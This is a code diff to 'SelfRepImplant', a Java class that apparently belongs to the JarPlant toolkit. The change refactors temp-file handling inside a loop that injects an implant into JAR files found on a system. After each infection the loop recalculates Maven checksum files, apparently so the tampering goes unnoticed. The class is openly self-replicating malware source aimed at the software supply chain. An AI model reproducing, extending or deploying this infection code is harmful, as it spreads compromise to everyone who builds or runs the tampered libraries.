@@ -5,7 +5,6 @@ import io.github.w1th4d.jarplant.*;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
-import java.nio.file.FileAlreadyExistsException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardOpenOption;
@@ -126,19 +125,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 throw new RuntimeException(e);
             }
 
-            Path outputTempFile;
             try {
-                outputTempFile = createTempFileFor(jarToImplant);
-            } catch (FileAlreadyExistsException e) {
-                System.out.println("[!] There's already a temp file for '" + jarToImplant + "'. Avoiding potential collisions. Skipping.");
-                System.out.println("[#] File already exist: " + e.getMessage());
-                continue;
-            } catch (IOException e) {
-                System.out.println("[-] Failed to create temp file for '" + jarToImplant + "'.");
-                continue;
-            }
-
-            try {
+                Path outputTempFile = createTempFileFor(jarToImplant);
                 JarFiddler jar = JarFiddler.buffer(jarToImplant);
                 boolean didInfect = injector.injectInto(jar);
                 if (didInfect) {
@@ -151,24 +139,10 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                     recalculateMavenChecksumFile(jarToImplant);
                 } else {
                     System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
-                    try {
-                        Files.delete(outputTempFile);
-                        System.out.println("[#] Cleaned up unused temp file '" + outputTempFile + "'.");
-                    } catch (IOException ignored) {
-                        System.out.println("[!] Cannot clean up unused temp file '" + outputTempFile + "'. Sorry for littering!");
-                    }
                 }
             } catch (IOException e) {
                 System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
                 //e.printStackTrace();
-
-                // TODO Extract or make this more water-tight
-                try {
-                    Files.delete(outputTempFile);
-                    System.out.println("[#] Cleaned up unused temp file '" + outputTempFile + "'.");
-                } catch (IOException ignored) {
-                    System.out.println("[!] Cannot clean up unused temp file '" + outputTempFile + "'. Sorry for littering!");
-                }
             }
         }
 
@@ -315,15 +289,24 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      *
      * @param baseFile filename to base the temporary file name on
      * @return new file
-     * @throws FileAlreadyExistsException if the file already exists
-     * @throws IOException                if the file cannot be created
+     * @throws IOException if anything went wrong
      */
-    private static Path createTempFileFor(Path baseFile) throws FileAlreadyExistsException, IOException {
+    private static Path createTempFileFor(Path baseFile) throws IOException {
         String targetFilename = baseFile.getFileName().toString();
 
         String newFileName = "." + targetFilename + ".tmp";
         Path tempFilePath = baseFile.resolveSibling(newFileName);
-        return Files.createFile(tempFilePath);
+        if (Files.exists(tempFilePath)) {
+            // Remember that several instances of this thing may run in parallel
+            System.out.println("[-] Temporary file '" + tempFilePath + "' already exist! Aborting.");
+            throw new IOException("File already exist: " + tempFilePath);
+        }
+        if (!Files.isWritable(tempFilePath.getParent())) {
+            System.out.println("[-] Path '" + tempFilePath.getParent() + "' is not writable! Aborting.");
+            throw new IOException("Not writable: " + tempFilePath);
+        }
+
+        return tempFilePath;
     }
 
     /**
